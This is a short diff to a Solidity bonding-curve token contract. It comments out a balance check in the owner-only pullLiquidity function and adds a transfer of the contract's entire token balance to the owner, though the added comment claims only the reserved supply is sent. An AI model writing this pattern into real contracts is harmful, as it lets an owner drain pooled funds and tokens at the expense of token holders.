@@ -233,11 +233,14 @@ contract BondingCurvePool is ERC20, Ownable, ReentrancyGuard{
     function pullLiquidity() external onlyOwner {
     uint256 amount = ethRaised;
     require(amount > 0, "No liquidity to pull");
-    require(address(this).balance >= amount, "Insufficient contract balance");
+    // require(address(this).balance >= amount, "Insufficient contract balance");
     
     // Reset ethRaised to 0 since we're pulling all liquidity
     ethRaised = 0;
-    
+
+    // send RESERVED_SUPPLY to owner
+    _transfer(address(this), owner(), balanceOf(address(this)));
+
     // Transfer to the actual owner
     payable(owner()).transfer(amount);
   }
